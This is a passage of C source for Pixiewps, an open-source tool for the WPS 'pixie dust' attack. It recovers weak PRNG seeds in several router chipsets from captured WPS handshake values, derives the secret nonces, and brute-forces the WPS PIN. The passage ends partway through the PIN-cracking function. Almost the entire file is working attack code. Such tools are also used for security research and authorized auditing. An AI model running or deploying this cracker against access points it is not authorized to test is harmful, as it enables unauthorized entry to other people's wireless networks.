/*
 * Pixiewps: bruteforce the wps pin exploiting the low or non-existing entropy of some APs (pixie dust attack).
 *           All credits for the research go to Dominique Bongard.
 *
 * Copyright (c) 2015, wiire <wi7ire@gmail.com>
 * SPDX-License-Identifier: GPL-3.0
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <getopt.h>

#include <sys/time.h>

#include "pixiewps.h"
#include "wps.h"
#include "random_r.h"
#include "config.h"
#include "utils.h"
#include "version.h"

uint32_t ecos_rand_simplest(uint32_t *seed);
uint32_t ecos_rand_simple(uint32_t *seed);
uint32_t ecos_rand_knuth(uint32_t *seed);
uint_fast8_t crack(struct global *g, unsigned int *pin);

static const char *option_string = "e:r:s:z:a:n:m:b:Sfv:Vh?";
static const struct option long_options[] = {
	{ "pke",       required_argument, 0, 'e' },
	{ "pkr",       required_argument, 0, 'r' },
	{ "e-hash1",   required_argument, 0, 's' },
	{ "e-hash2",   required_argument, 0, 'z' },
	{ "authkey",   required_argument, 0, 'a' },
	{ "e-nonce",   required_argument, 0, 'n' },
	{ "r-nonce",   required_argument, 0, 'm' },
	{ "e-bssid",   required_argument, 0, 'b' },
	{ "dh-small",  no_argument,       0, 'S' },
	{ "force",     no_argument,       0, 'f' },
	{ "verbosity", required_argument, 0, 'v' },
	{ "version",   no_argument,       0, 'V' },
	{ "help",      no_argument,       0,  0  },
	{ "mode",      required_argument, 0,  1  },
	{ "start",     required_argument, 0,  2  },
	{ "end",       required_argument, 0,  3  },
	{  0,          no_argument,       0, 'h' },
	{  0,          0,                 0,  0  }
};

int main(int argc, char **argv) {

	struct global *wps;
	if ((wps = calloc(1, sizeof(struct global)))) {
		wps->mode_auto = 1;
		wps->verbosity = 3;
		wps->error = calloc(256, 1);
		if (!wps->error)
			goto memory_err;
		wps->error[0] = '\n';
	} else {
memory_err:
		fprintf(stderr, "\n [X] Memory allocation error!\n");
		return MEM_ERROR;
	}

	time_t start_p = (time_t) -1, end_p = (time_t) -1;
	clock_t c_start = 0, c_end;

	int opt = 0;
	int long_index = 0;
	uint_fast8_t c = 0;
	opt = getopt_long(argc, argv, option_string, long_options, &long_index);
	while (opt != -1) {
		c++;
		switch (opt) {
			case 'e':
				wps->pke = malloc(WPS_PKEY_LEN);
				if (!wps->pke)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->pke, WPS_PKEY_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad enrollee public key -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'r':
				wps->pkr = malloc(WPS_PKEY_LEN);
				if (!wps->pkr)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->pkr, WPS_PKEY_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad registrar public key -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 's':
				wps->e_hash1 = malloc(WPS_HASH_LEN);
				if (!wps->e_hash1)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_hash1, WPS_HASH_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad hash -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'z':
				wps->e_hash2 = malloc(WPS_HASH_LEN);
				if (!wps->e_hash2)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_hash2, WPS_HASH_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad hash -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'a':
				wps->authkey = malloc(WPS_AUTHKEY_LEN);
				if (!wps->authkey)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->authkey, WPS_HASH_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad authentication session key -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'n':
				wps->e_nonce = malloc(WPS_NONCE_LEN);
				if (!wps->e_nonce)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_nonce, WPS_NONCE_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad enrollee nonce -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'm':
				wps->r_nonce = malloc(WPS_NONCE_LEN);
				if (!wps->r_nonce)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->r_nonce, WPS_NONCE_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad registrar nonce -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'b':
				wps->e_bssid = malloc(WPS_BSSID_LEN);
				if (!wps->e_bssid)
					goto memory_err;
				if (hex_string_to_byte_array(optarg, wps->e_bssid, WPS_BSSID_LEN)) {
					snprintf(wps->error, 256, "\n [!] Bad enrollee MAC address -- %s\n\n", optarg);
					goto usage_err;
				}
				break;
			case 'S':
				wps->small_dh_keys = 1;
				break;
			case 'f':
				wps->bruteforce = 1;
				break;
			case 'v':
				if (get_int(optarg, &wps->verbosity) != 0 || wps->verbosity < 1 || wps->verbosity > 3) {
					snprintf(wps->error, 256, "\n [!] Bad verbosity level -- %s\n\n", optarg);
					goto usage_err;
				};
				break;
			case 'V':
			{
				if (c > 1) { /* If --version is used then no other argument should be supplied */
					snprintf(wps->error, 256, "\n [!] Bad use of argument --version (-V)!\n\n");
					goto usage_err;
				} else {
					struct timeval t_current;
					gettimeofday(&t_current, 0);
					time_t r_time;
					struct tm ts;
					char buffer[30];
					r_time = t_current.tv_sec;
					ts = *gmtime(&r_time);
					strftime(buffer, 30, "%c", &ts);
					fprintf(stderr, "\n Pixiewps %s\n\n [*] System time: %lu (%s UTC)\n\n",
						LONG_VERSION, (unsigned long) t_current.tv_sec, buffer);
					free(wps->error);
					free(wps);
					return ARG_ERROR;
				}
			}
			case 'h':
				goto usage_err;
				break;
			case  0 :
				if (strcmp("help", long_options[long_index].name) == 0) {
					fprintf(stderr, v_usage, SHORT_VERSION,
						p_mode_name[RT],
						p_mode_name[ECOS_SIMPLE],
						p_mode_name[RTL819x],
						p_mode_name[ECOS_SIMPLEST],
						p_mode_name[ECOS_KNUTH]
					);
					free(wps->error);
					free(wps);
					return ARG_ERROR;
				}
				goto usage_err;
			case  1 :
				if (strcmp("mode", long_options[long_index].name) == 0) {
					if (parse_mode(optarg, p_mode, MODE_LEN)) {
						snprintf(wps->error, 256, "\n [!] Bad modes -- %s\n\n", optarg);
						goto usage_err;
					}
					wps->mode_auto = 0;
					break;
				}
				goto usage_err;
			case  2 :
				if (strcmp("start", long_options[long_index].name) == 0) {
					if (get_unix_datetime(optarg, &(start_p))) {
						snprintf(wps->error, 256, "\n [!] Bad starting point -- %s\n\n", optarg);
						goto usage_err;
					}
					break;
				}
				goto usage_err;
			case  3 :
				if (strcmp("end", long_options[long_index].name) == 0) {
					if (get_unix_datetime(optarg, &(end_p))) {
						snprintf(wps->error, 256, "\n [!] Bad ending point -- %s\n\n", optarg);
						goto usage_err;
					}
					break;
				}
				goto usage_err;
			case '?':
			default:
				fprintf(stderr, "Run %s -h for help.\n", argv[0]);
				free(wps->error);
				free(wps);
				return ARG_ERROR;
		}
		opt = getopt_long(argc, argv, option_string, long_options, &long_index);
	}

	if (argc - optind != 0) {
		snprintf(wps->error, 256, "\n [!] Unknown extra argument(s)!\n\n");
		goto usage_err;
	} else {
		if (!c) {
usage_err:
			fprintf(stderr, usage, SHORT_VERSION, argv[0], wps->error);

			free(wps->pke);
			free(wps->pkr);
			free(wps->e_hash1);
			free(wps->e_hash2);
			free(wps->authkey);
			free(wps->e_nonce);
			free(wps->r_nonce);
			free(wps->e_bssid);

			free(wps->error);
			free(wps);
			return ARG_ERROR;
		}
	}

	/* Not all required arguments have been supplied */
	if (wps->pke == 0 || wps->e_hash1 == 0 || wps->e_hash2 == 0) {
		snprintf(wps->error, 256, "\n [!] Not all required arguments have been supplied!\n\n");
		goto usage_err;
	}

	/* If --dh-small is selected then no --pkr should be supplied */
	if (wps->pkr && wps->small_dh_keys) {
		snprintf(wps->error, 256, "\n [!] Options --dh-small and --pkr are mutually exclusive!\n\n");
		goto usage_err;
	}

	/* Either --pkr or --dh-small must be specified */
	if (!wps->pkr && !wps->small_dh_keys) {
		snprintf(wps->error, 256, "\n [!] Either --pkr or --dh-small must be specified!\n\n");
		goto usage_err;
	}

	/* Cannot specify --start or --end if --force is selected */
	if (wps->bruteforce && ((start_p != (time_t) -1) || (end_p != (time_t) -1))) {
		snprintf(wps->error, 256, "\n [!] Cannot specify --start or --end if --force is selected!\n\n");
		goto usage_err;
	}

	if (wps->mode_auto) { /* Mode auto */
		if (wps->pke && !memcmp(wps->pke, wps_rtl_pke, WPS_PKEY_LEN)) {
			p_mode[0] = RTL819x;
			p_mode[1] = NONE;
			if (!wps->e_nonce) {
				snprintf(wps->error, 256, "\n [!] Enrollee nonce is needed for mode %u!\n\n", RTL819x);
				goto usage_err;
			}
		} else {
			p_mode[0] = RT;
			p_mode[1] = ECOS_SIMPLE;

			/* Not tested */
#ifdef EXTRA
			p_mode[2] = ECOS_SIMPLEST;
			p_mode[3] = ECOS_KNUTH;
			p_mode[4] = NONE;
#else
			p_mode[2] = NONE;
#endif
		}
	}

	DEBUG_PRINT("Debugging enabled");
	DEBUG_PRINT("Modes: %d (%s), %d (%s), %d (%s), %d (%s), %d (%s)",
		p_mode[0], p_mode_name[p_mode[0]],
		p_mode[1], p_mode_name[p_mode[1]],
		p_mode[2], p_mode_name[p_mode[2]],
		p_mode[3], p_mode_name[p_mode[3]],
		p_mode[4], p_mode_name[p_mode[4]]
	);

	if (is_mode_selected(RTL819x)) { /* Ignore --start and --end otherwise */

		struct timeval t_now;
		gettimeofday(&t_now, 0);
		wps->start = t_now.tv_sec;
		wps->end = t_now.tv_sec - MODE3_DAYS * SEC_PER_DAY;

		/* Attributes --start and --end can be switched start > end or end > start */
		if (start_p != (time_t) -1) {
			if (end_p != (time_t) -1) {

				/* Attributes --start and --end must be different */
				if (start_p == end_p) {
					snprintf(wps->error, 256, "\n [!] Starting and Ending points must be different!\n\n");
					goto usage_err;
				}
				if (end_p > start_p) {
					wps->start = end_p;
					wps->end = start_p;
				} else {
					wps->start = start_p;
					wps->end = end_p;
				}
			} else {
				if (start_p >= wps->start) {
					snprintf(wps->error, 256, "\n [!] Bad Starting point!\n\n");
					goto usage_err;
				} else {
					wps->end = start_p;
				}
			}
		} else {
			if (end_p != (time_t) -1) {
				if (end_p >= wps->start) {
					snprintf(wps->error, 256, "\n [!] Bad Ending point!\n\n");
					goto usage_err;
				} else {
					wps->end = end_p;
				}
			} else {
				if (wps->bruteforce)
					wps->end = 0;
			}
		}
	}

	if (wps->small_dh_keys) { /* Small DH keys selected */
		wps->pkr = malloc(WPS_PKEY_LEN);
		if (!wps->pkr)
			goto memory_err;

		/* g^A mod p = 2 (g = 2, A = 1, p > 2) */
		memset(wps->pkr, 0, WPS_PKEY_LEN - 1);
		wps->pkr[WPS_PKEY_LEN - 1] = 0x02;

		if (!wps->authkey) {
			if (wps->e_nonce) {
				if (wps->r_nonce) {
					if (wps->e_bssid) { /* Computing AuthKey */
						wps->dhkey = malloc(WPS_HASH_LEN);
						if (!wps->dhkey)
							goto memory_err;
						wps->kdk = malloc(WPS_HASH_LEN);
						if (!wps->kdk)
							goto memory_err;

						uint8_t *buffer = malloc(WPS_NONCE_LEN * 2 + WPS_BSSID_LEN);
						if (!buffer)
							goto memory_err;

						c_start = clock();

						/* DHKey = SHA-256(g^(AB) mod p) = SHA-256(PKe^A mod p) = SHA-256(PKe) (g = 2, A = 1, p > 2) */
						sha256(wps->pke, WPS_PKEY_LEN, wps->dhkey);

						memcpy(buffer, wps->e_nonce, WPS_NONCE_LEN);
						memcpy(buffer + WPS_NONCE_LEN, wps->e_bssid, WPS_BSSID_LEN);
						memcpy(buffer + WPS_NONCE_LEN + WPS_BSSID_LEN, wps->r_nonce, WPS_NONCE_LEN);

						/* KDK = HMAC-SHA-256{DHKey}(Enrollee nonce || Enrollee MAC || Registrar nonce) */
						hmac_sha256(wps->dhkey, WPS_HASH_LEN, buffer, WPS_NONCE_LEN * 2 + WPS_BSSID_LEN, wps->kdk);

						buffer = realloc(buffer, WPS_HASH_LEN * 3);
						if (!buffer)
							goto memory_err;

						/* Key derivation function */
						kdf(wps->kdk, buffer);

						wps->authkey = malloc(WPS_AUTHKEY_LEN);
						if (!wps->authkey)
							goto memory_err;

						memcpy(wps->authkey, buffer, WPS_AUTHKEY_LEN);
						
						if (wps->verbosity > 2) {
							wps->wrapkey = malloc(WPS_KEYWRAPKEY_LEN);
							if (!wps->wrapkey)
								goto memory_err;
							wps->emsk = malloc(WPS_EMSK_LEN);
							if (!wps->emsk)
								goto memory_err;

							memcpy(wps->wrapkey, buffer + WPS_AUTHKEY_LEN, WPS_KEYWRAPKEY_LEN);
							memcpy(wps->emsk, buffer + WPS_AUTHKEY_LEN + WPS_KEYWRAPKEY_LEN, WPS_EMSK_LEN);
						}
						if (wps->verbosity < 3) {
							free(wps->dhkey);
							free(wps->kdk);
						}
						free(buffer);
					} else {
						snprintf(wps->error, 256, "\n [!] Neither --authkey and --e-bssid have been supplied!\n\n");
						goto usage_err;
					}
				} else {
					snprintf(wps->error, 256, "\n [!] Neither --authkey and --r-nonce have been supplied!\n\n");
					goto usage_err;
				}
			} else {
				snprintf(wps->error, 256, "\n [!] Neither --authkey and --e-nonce have been supplied!\n\n");
				goto usage_err;
			}
		}
	}

	/* E-S1 = E-S2 = 0 */
	wps->e_s1 = calloc(WPS_SECRET_NONCE_LEN, 1); if (!wps->e_s1) goto memory_err;
	wps->e_s2 = calloc(WPS_SECRET_NONCE_LEN, 1); if (!wps->e_s2) goto memory_err;

	/* Allocating memory for digests */
	wps->psk1 = malloc(WPS_HASH_LEN); if (!wps->psk1) goto memory_err;
	wps->psk2 = malloc(WPS_HASH_LEN); if (!wps->psk2) goto memory_err;

	uint_fast8_t k = 0;
	uint_fast8_t found_p_mode = NONE;
	unsigned int pin;
	uint32_t seed;
	uint32_t print_seed = 0;

	if (!c_start)
		c_start = clock();

	/* Main loop */
	while (!found_p_mode && p_mode[k] != NONE && k < MODE_LEN) {

		/* 1 */
		if (p_mode[k] == RT) {

			DEBUG_PRINT(" * Mode: %d (%s)", RT, p_mode_name[RT]);
			DEBUG_PRINT("Trying with E-S1: ");
			DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
			DEBUG_PRINT("Trying with E-S2: ");
			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

			uint_fast8_t r = crack(wps, &pin);
			if (r == PIN_FOUND) {
				found_p_mode = RT;
				DEBUG_PRINT("Pin found");
			} else if (r == MEM_ERROR) {
				goto memory_err;
			}

		/* 2 */
		} else if (p_mode[k] == ECOS_SIMPLE && wps->e_nonce) {

			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_SIMPLE, p_mode_name[ECOS_SIMPLE]);

			uint32_t index = wps->e_nonce[0] << 25; /* Reducing entropy from 32 to 25 bits */
			do {
				seed = index;
				uint_fast8_t i;
				for (i = 1; i < WPS_NONCE_LEN; i++) {
					if (wps->e_nonce[i] != (uint8_t) (ecos_rand_simple(&seed) & 0xff))
						break;
				}
				if (i == WPS_NONCE_LEN) { /* Seed found */
					print_seed = seed;

					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
						wps->e_s1[i] = (uint8_t) (ecos_rand_simple(&seed) & 0xff);

					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
						wps->e_s2[i] = (uint8_t) (ecos_rand_simple(&seed) & 0xff);

					DEBUG_PRINT("Seed found");
					break;
				}
				index++;
			} while (!(index & 0x02000000));

			if (print_seed) { /* Seed found */

				DEBUG_PRINT("Trying with E-S1: ");
				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
				DEBUG_PRINT("Trying with E-S2: ");
				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

				uint_fast8_t r = crack(wps, &pin);
				if (r == PIN_FOUND) {
					found_p_mode = ECOS_SIMPLE;
					DEBUG_PRINT("Pin found");
				} else if (r == MEM_ERROR) {
					goto memory_err;
				}
			}

		/* 3 */
		} else if (p_mode[k] == RTL819x && wps->e_nonce) {

			DEBUG_PRINT(" * Mode: %d (%s)", RTL819x, p_mode_name[RTL819x]);

			/* E-S1 = E-S2 = E-Nonce - Best case scenario */
			memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN);
			memcpy(wps->e_s2, wps->e_nonce, WPS_SECRET_NONCE_LEN);

			DEBUG_PRINT("Trying with E-S1: ");
			DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
			DEBUG_PRINT("Trying with E-S2: ");
			DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

			uint_fast8_t r = crack(wps, &pin);
			if (r == PIN_FOUND) {
				found_p_mode = RTL819x;
				DEBUG_PRINT("Pin found");
			} else if (r == MEM_ERROR) {
				goto memory_err;
			}

			if (found_p_mode == NONE) {
				if (wps->small_dh_keys || check_small_dh_keys(wps->pkr)) {
					if (!wps->warning) {
						wps->warning = calloc(256, 1);
						if (!wps->warning)
							goto memory_err;
						snprintf(wps->warning, 256, " [!] Small DH keys is not supported for mode %u!\n\n", RTL819x);
					}
				} else {

					/* Checks if the sequence may actually be generated by current random function */
					if (!(wps->e_nonce[0] & 0x80) && !(wps->e_nonce[4]  & 0x80) &&
						!(wps->e_nonce[8] & 0x80) && !(wps->e_nonce[12] & 0x80)) {

						/* Converting enrollee nonce to the sequence may be generated by current random function */
						uint32_t randr_enonce[4] = { 0 };
						uint_fast8_t j = 0;
						for (uint_fast8_t i = 0; i < 4; i++) {
							randr_enonce[i] |= wps->e_nonce[j++];
							randr_enonce[i] <<= 8;
							randr_enonce[i] |= wps->e_nonce[j++];
							randr_enonce[i] <<= 8;
							randr_enonce[i] |= wps->e_nonce[j++];
							randr_enonce[i] <<= 8;
							randr_enonce[i] |= wps->e_nonce[j++];
						}

						#if DEBUG
						{
							struct tm ts;
							char buffer[30];
							ts = *gmtime(&wps->start);
							strftime(buffer, 30, "%c", &ts);
							printf("\n [DEBUG] %s:%d:%s(): Start: %10lu (%s UTC)",
								__FILE__, __LINE__, __func__, (unsigned long) wps->start, buffer);
							ts = *gmtime(&wps->end);
							strftime(buffer, 30, "%c", &ts);
							printf("\n [DEBUG] %s:%d:%s(): End:   %10lu (%s UTC)",
								__FILE__, __LINE__, __func__, (unsigned long) wps->end, buffer);
							fflush(stdout);
						}
						#endif

						struct random_data *buf = calloc(1, sizeof(struct random_data));
						char *rand_statebuf = calloc(1, 128);

						seed = wps->start;
						uint32_t limit = wps->end;
						initstate_r(seed, rand_statebuf, 128, buf);
						int32_t res = 0;

						while (1) {
							srandom_r(seed, buf);
							uint_fast8_t i;
							for (i = 0; i < 4; i++) {
								random_r(buf, &res);
								if ((uint32_t) res != randr_enonce[i])
									break;
							}

							if (i == 4) {
								print_seed = seed;
								DEBUG_PRINT("Seed found");
							}

							if (print_seed || seed == limit) {
								break;
							}

							seed--;
						}

						if (print_seed) { /* Seed found */
							uint_fast8_t i = 0;
							uint8_t tmp_s_nonce[16];
							do {
								i++;
								srandom_r(print_seed + i, buf);
								for (uint_fast8_t j = 0; j < 4; j++) {
									random_r(buf, &res);
									uint32_t be = h32_to_be(res);
									memcpy(&(wps->e_s1[4 * j]), &be, 4);
									memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN);        /* E-S1 = E-S2 != E-Nonce */
								}

								DEBUG_PRINT("Trying with E-S1: ");
								DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
								DEBUG_PRINT("Trying with E-S2: ");
								DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

								uint_fast8_t r = crack(wps, &pin);
								if (r == PIN_FOUND) {
									found_p_mode = RTL819x;
									DEBUG_PRINT("Pin found");
								} else if (r == PIN_ERROR) {
									if (i == 1) {
										memcpy(wps->e_s1, wps->e_nonce, WPS_SECRET_NONCE_LEN); /* E-S1 = E-Nonce != E-S2 */
										memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* Chaching for next round, see below */
									} else {
										memcpy(wps->e_s1, tmp_s_nonce, WPS_SECRET_NONCE_LEN);
										memcpy(tmp_s_nonce, wps->e_s2, WPS_SECRET_NONCE_LEN);  /* E-S1 = old E-S1, E-S2 = new E-S2 */
									}

									DEBUG_PRINT("Trying with E-S1: ");
									DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
									DEBUG_PRINT("Trying with E-S2: ");
									DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

									uint_fast8_t r2 = crack(wps, &pin);
									if (r2 == PIN_FOUND) {
										found_p_mode = RTL819x;
										DEBUG_PRINT("Pin found");
									} else if (r2 == MEM_ERROR) {
										goto memory_err;
									}
								} else if (r == MEM_ERROR) {
									goto memory_err;
								}
							} while (found_p_mode == NONE && i <= MODE3_TRIES);
						}

						if (found_p_mode == NONE && !wps->bruteforce) {
							if (!wps->warning) {
								wps->warning = calloc(256, 1);
								if (!wps->warning)
									goto memory_err;
								snprintf(wps->warning, 256, " [!] The AP /might be/ vulnerable. Try again with --force or with another (newer) set of data.\n\n");
							}
						}

						free(buf);
						free(rand_statebuf);
					}
				}
			}

		/* 4 */
		} else if (p_mode[k] == ECOS_SIMPLEST && wps->e_nonce) {

			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_SIMPLEST, p_mode_name[ECOS_SIMPLEST]);

			uint32_t index = 0;
			do {
				seed = index;
				uint_fast8_t i;
				for (i = 0; i < WPS_NONCE_LEN; i++) {
					if (wps->e_nonce[i] != (uint8_t) ecos_rand_simplest(&seed))
						break;
				}
				if (i == WPS_NONCE_LEN) { /* Seed found */
					print_seed = seed;

					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
						wps->e_s1[i] = (uint8_t) ecos_rand_simplest(&seed);

					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
						wps->e_s2[i] = (uint8_t) ecos_rand_simplest(&seed);

					DEBUG_PRINT("Seed found");
					break;
				}
				index++;
			} while (index != 0xffffffff);

			if (print_seed) { /* Seed found */

				DEBUG_PRINT("Trying with E-S1: ");
				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
				DEBUG_PRINT("Trying with E-S2: ");
				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

				uint_fast8_t r = crack(wps, &pin);
				if (r == PIN_FOUND) {
					found_p_mode = ECOS_SIMPLEST;
					DEBUG_PRINT("Pin found");
				} else if (r == MEM_ERROR) {
					goto memory_err;
				}
			}

		/* 5 */
		} else if (p_mode[k] == ECOS_KNUTH && wps->e_nonce) {

			DEBUG_PRINT(" * Mode: %d (%s)", ECOS_KNUTH, p_mode_name[ECOS_KNUTH]);

			uint32_t index = 0;
			do {
				seed = index;
				uint_fast8_t i;
				for (i = 0; i < WPS_NONCE_LEN; i++) {
					if (wps->e_nonce[i] != (uint8_t) ecos_rand_knuth(&seed))
						break;
				}
				if (i == WPS_NONCE_LEN) { /* Seed found */
					print_seed = seed;

					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S1 */
						wps->e_s1[i] = (uint8_t) ecos_rand_knuth(&seed);

					for (i = 0; i < WPS_SECRET_NONCE_LEN; i++) /* Advance to get E-S2 */
						wps->e_s2[i] = (uint8_t) ecos_rand_knuth(&seed);

					DEBUG_PRINT("Seed found");
					break;
				}
				index++;
			} while (index != 0xffffffff);

			if (print_seed) { /* Seed found */

				DEBUG_PRINT("Trying with E-S1: ");
				DEBUG_PRINT_ARRAY(wps->e_s1, WPS_SECRET_NONCE_LEN);
				DEBUG_PRINT("Trying with E-S2: ");
				DEBUG_PRINT_ARRAY(wps->e_s2, WPS_SECRET_NONCE_LEN);

				uint_fast8_t r = crack(wps, &pin);
				if (r == PIN_FOUND) {
					found_p_mode = ECOS_KNUTH;
					DEBUG_PRINT("Pin found");
				} else if (r == MEM_ERROR) {
					goto memory_err;
				}
			}

		}

		k++;
	}

	c_end = clock();
	unsigned long long ms_elapsed = (c_end - c_start) / (CLOCKS_PER_SEC / 1000);

	k--;

#ifdef DEBUG
	puts("");
#endif

	printf("\n Pixiewps %s\n", SHORT_VERSION);

	if (found_p_mode) {
		if (wps->e_nonce) {
			if (wps->verbosity > 2) {
				if ((found_p_mode == ECOS_SIMPLE || (found_p_mode == RTL819x && print_seed)
					|| found_p_mode == ECOS_SIMPLEST || found_p_mode == ECOS_KNUTH)) {

					printf("\n [*] PRNG Seed:  %u", print_seed);
				}
				if (found_p_mode == RTL819x && print_seed) {
					time_t seed_time;
					struct tm ts;
					char buffer[30];

					seed_time = print_seed;
					ts = *gmtime(&seed_time);
					strftime(buffer, 30, "%c", &ts);
					printf(" (%s UTC)", buffer);
				}
			}
		}
		if (wps->verbosity > 1) {
			printf("\n [*] Mode:       %u (%s)", found_p_mode, p_mode_name[found_p_mode]);
		}
		if (wps->verbosity > 2) {
			if (wps->dhkey) { /* To see if AuthKey was supplied or not */
				printf("\n [*] DHKey:      "); byte_array_print(wps->dhkey, WPS_HASH_LEN);
				printf("\n [*] KDK:        "); byte_array_print(wps->kdk, WPS_HASH_LEN);
				printf("\n [*] AuthKey:    "); byte_array_print(wps->authkey, WPS_AUTHKEY_LEN);
				printf("\n [*] EMSK:       "); byte_array_print(wps->emsk, WPS_EMSK_LEN);
				printf("\n [*] KeyWrapKey: "); byte_array_print(wps->wrapkey, WPS_KEYWRAPKEY_LEN);
			}
			printf("\n [*] PSK1:       "); byte_array_print(wps->psk1, WPS_PSK_LEN);
			printf("\n [*] PSK2:       "); byte_array_print(wps->psk2, WPS_PSK_LEN);
		}
		if (wps->verbosity > 1) {
			printf("\n [*] E-S1:       "); byte_array_print(wps->e_s1, WPS_SECRET_NONCE_LEN);
			printf("\n [*] E-S2:       "); byte_array_print(wps->e_s2, WPS_SECRET_NONCE_LEN);
		}
		printf("\n [+] WPS pin:    %08u", pin);
	} else {
		printf("\n [-] WPS pin not found!");
	}
	printf("\n\n [*] Time taken: %llu s %llu ms\n\n", ms_elapsed / 1000, ms_elapsed % 1000);

	if (wps->warning) {
		printf("%s", wps->warning);
		free(wps->warning);
	}

	free(wps->pke);
	free(wps->pkr);
	free(wps->e_hash1);
	free(wps->e_hash2);
	free(wps->authkey);
	free(wps->e_nonce);
	free(wps->r_nonce);
	free(wps->e_bssid);
	free(wps->psk1);
	free(wps->psk2);
	free(wps->e_s1);
	free(wps->e_s2);
	free(wps->error);

	if (wps->verbosity > 2) {
		free(wps->dhkey);
		free(wps->kdk);
		free(wps->wrapkey);
		free(wps->emsk);
	}

	free(wps);

	return found_p_mode != 0 ? PIN_FOUND : PIN_ERROR;
}

/* Simplest */
uint32_t ecos_rand_simplest(uint32_t *seed) {
	*seed = (*seed * 1103515245) + 12345; /* Permutate seed */
	return *seed;
}

/* Simple, Linear congruential generator */
uint32_t ecos_rand_simple(uint32_t *seed) {
	uint32_t s = *seed;
	uint32_t uret;

	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret = s & 0xffe00000;                 /* Use top 11 bits */
	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret += (s & 0xfffc0000) >> 11;        /* Use top 14 bits */
	s = (s * 1103515245) + 12345;          /* Permutate seed */
	uret += (s & 0xfe000000) >> (11 + 14); /* Use top 7 bits */

	*seed = s;
	return uret;
}

/* Mersenne-Knuth */
uint32_t ecos_rand_knuth(uint32_t *seed) {
	#define MM 2147483647 /* Mersenne prime */
	#define AA 48271      /* This does well in the spectral test */
	#define QQ 44488      /* MM / AA */
	#define RR 3399       /* MM % AA, important that RR < QQ */

	*seed = AA * (*seed % QQ) - RR * (*seed / QQ);
	if (*seed & 0x80000000)
		*seed += MM;

	return *seed;
}

/* PIN cracking attempt */
uint_fast8_t crack(struct global *g, unsigned int *pin) {
	struct global *wps = g;
	unsigned int first_half = 0;
	unsigned int second_half = 0;
	uint8_t s_pin[4];
	uint_fast8_t found = 0;

	uint8_t *buffer = malloc(WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN * 2);
	if (!buffer)
		return MEM_ERROR;

	uint8_t *result = malloc(WPS_HASH_LEN);
	if (!result)
		return MEM_ERROR;

	while (first_half < 10000) {
		uint_to_char_array(first_half, 4, s_pin);
		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, s_pin, 4, wps->psk1);
		memcpy(buffer, wps->e_s1, WPS_SECRET_NONCE_LEN);
		memcpy(buffer + WPS_SECRET_NONCE_LEN, wps->psk1, WPS_PSK_LEN);
		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN, wps->pke, WPS_PKEY_LEN);
		memcpy(buffer + WPS_SECRET_NONCE_LEN + WPS_PSK_LEN + WPS_PKEY_LEN, wps->pkr, WPS_PKEY_LEN);
		hmac_sha256(wps->authkey, WPS_AUTHKEY_LEN, buffer,
